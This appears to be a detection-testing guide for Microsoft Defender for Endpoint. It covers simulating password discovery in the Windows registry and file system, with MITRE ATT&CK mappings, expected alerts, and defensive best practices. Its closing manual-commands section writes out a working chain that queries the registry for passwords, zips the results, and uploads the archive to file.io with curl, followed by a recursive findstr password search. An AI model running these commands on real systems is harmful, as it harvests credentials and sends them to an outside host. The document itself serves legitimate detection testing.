# Password Detection

## Overview

Attackers will query the Registry and local file system to find credentials and passwords saved by programs, services, user-created credential files, shared credential stores, configuration files with system or service passwords, or source code and binaries with embedded credentials. These credentials may be used for automatic logons, enabling attackers to gain unauthorized access. Attackers then leverage the discovered password information to launch further attacks, such as unauthorized access, privilege escalation, or lateral movement within the network.

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
| --- | --- | --- |
| Credential Access | T1552.001 | Unsecured Credentials: Credentials In Files |
| Credential Access | T1552.002 | Unsecured Credentials: Credentials in Registry |
| Discovery | T1012 | Query Registry |
| Exfiltration | T1567 | Exfiltration Over Web Service |

## Expected Alerts

| Alert Title | Alert Description | Alert Details |
| --- | --- | --- |
| Registry queried for passwords | A registry query operation searching for passwords was performed. Attackers search through registry keys, values, and data to steal credentials. | **Category:** Credential access<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1012: Query Registry, T1552.002: Credentials in Registry<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior, Network<br/>**Detection status:** Detected |
| Password stealing from files | An attacker tried to look for passwords in files or sysvol (MS14-025) | **Category:** Discovery<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1201: Password Policy Discovery, T1552: Unsecured Credentials, T1552.001: Credentials In Files, T1555: Credentials from Password Stores<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior, Network<br/>**Detection status:** Detected |
| Suspicious curl behavior | Suspicious curl behavior has been observed on this machine. Attackers may use curl to download malicious files onto your machine, or to copy malicious files onto other machines in your network. | **Category:** Malware<br/>**MITRE ATT&CK Techniques:** T1105: Ingress Tool Transfer<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior<br/>**Detection status:** Detected |
| Possible content exfiltration | Data and file exfiltration was observed on this device. Attackers might be collecting sensitive data, including credentials for different services. Attackers often package the data collected to avoid detection on removal. | **Category:** Malware<br/>**MITRE ATT&CK Techniques:** T1041: Exfiltration Over C2 Channel, T1048: Exfiltration Over Alternative Protocol, T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol, T1567: Exfiltration Over Web Service<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior, Network<br/>**Detection status:** Detected |

## Attack Simulation

### Prerequisites

- Windows 10/11 or Windows Server test environment
- PowerShell (Administrator recommended for HKLM access)
- Microsoft Defender for Endpoint onboarded device

### Script: Invoke-PasswordDetectionSimulation.ps1

#### Parameters

| Parameter | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `OutputPath` | String | No | `$env:Temp\creds` | The path where discovered credentials will be saved |
| `SearchPath` | String | No | `C:\Users` | The file system path to search for password strings |
| `CleanUp` | Switch | No | — | Remove all files created by the simulation |
| `Force` | Switch | No | — | Skip the confirmation prompt before execution |

#### What the Script Does

1. **Searches HKCU registry** — Recursively searches for keys/values containing "password"
2. **Searches HKLM registry** — Recursively searches for keys/values containing "password"
3. **Searches file system** — Scans files in SearchPath for password strings
4. **Creates archive** — Compresses results and uploads to file.io (simulation only)

## Setup

### Usage Examples

```powershell
# Run with default settings
.\Invoke-PasswordDetectionSimulation.ps1

# Run with custom output and search paths
.\Invoke-PasswordDetectionSimulation.ps1 -OutputPath "C:\temp\output" -SearchPath "C:\Data"

# Run with Force to skip confirmation
.\Invoke-PasswordDetectionSimulation.ps1 -Force

# Clean up simulation artifacts
.\Invoke-PasswordDetectionSimulation.ps1 -CleanUp
```

### Expected Output

```
================================================
           ***  INFORMATION  *** 
     Password Detection Simulation Script
================================================

This script will search for password-related information:
  - Search HKCU registry for 'password' strings
  - Search HKLM registry for 'password' strings
  - Search files in 'C:\Users' for 'password' strings
  - Create a compressed archive of results

Output will be saved to: C:\Users\...\AppData\Local\Temp\creds

Do you want to continue? (Y/N): Y

Searching HKCU registry hive for password-related entries...
  [VALUE] HKCU:\Software\...\password = ********
Searching HKLM registry hive for password-related entries...
  [KEY] HKLM:\SOFTWARE\...\Passwords
Searching file system for password strings...
Creating compressed archive...
```

## Scenario Execution

1. Open a PowerShell prompt on the test device (Administrator recommended for HKLM access).
2. Navigate to the directory containing the script.
3. Run `.\Invoke-PasswordDetectionSimulation.ps1` and confirm with `Y`.
4. Wait for the registry and file system searches to complete.
5. Review the generated output files in the output directory.
6. Monitor the Microsoft Defender for Endpoint portal for credential access and exfiltration alerts.
7. After testing, run `.\Invoke-PasswordDetectionSimulation.ps1 -CleanUp` to remove all artifacts.

## Why Does This Matter

Password discovery is a critical reconnaissance technique because:

- **Find stored credentials** — Many applications store passwords in plaintext in registry or config files.
- **Access sensitive data** — Discovered passwords enable access to databases, services, and other systems.
- **Lateral movement** — Credentials found on one system often work on others.
- **Privilege escalation** — Service account passwords may have elevated privileges.

Detecting password searches helps identify attackers during the credential harvesting phase.

## Best Practices

- **Monitor for password searches** — Alert on reg query commands searching for "password" strings
- **Use credential management** — Store credentials in secure vaults, not plaintext files or registry
- **Implement data loss prevention** — Detect and block exfiltration of credential archives
- **Review file permissions** — Limit read access to configuration files containing credentials
- **Audit registry access** — Log access to registry locations known to contain credentials
- **Encrypt sensitive data** — Use DPAPI or other encryption for stored credentials

## Clean-Up

Run the script with the `-CleanUp` parameter or manually remove the output folder:

```powershell
# Using script
.\Invoke-PasswordDetectionSimulation.ps1 -CleanUp

# Manual cleanup
$folderPath = "$env:TEMP\creds"
Remove-Item -Path $folderPath -Recurse -Force
```

## References

- [MITRE ATT&CK T1552.001 - Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1552.002 - Credentials in Registry](https://attack.mitre.org/techniques/T1552/002/)
- [MITRE ATT&CK T1012 - Query Registry](https://attack.mitre.org/techniques/T1012/)
- [Microsoft Docs - Windows Registry](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry)

## Additional Manual Commands

### Password Search (Manual Commands)

#### Registry Search

```powershell
$uploadLocation = "http://file.io/?expires=1s"
$folderPath = "$env:TEMP\creds"
New-Item -Path $folderPath -ItemType Directory -ErrorAction SilentlyContinue

reg query HKCU /f password /t REG_SZ /s > "$folderPath\HKCU_Passwords.txt"
reg query HKLM /f password /t REG_SZ /s > "$folderPath\HKLM_Passwords.txt"

$zipFilePath = "$folderPath\passwords.zip"
Compress-Archive -Path $folderPath -DestinationPath $zipFilePath -Force

curl -F "file=@$zipFilePath" $uploadLocation
```

#### File System Search

```powershell
findstr /s /i /m "password" *.*
```
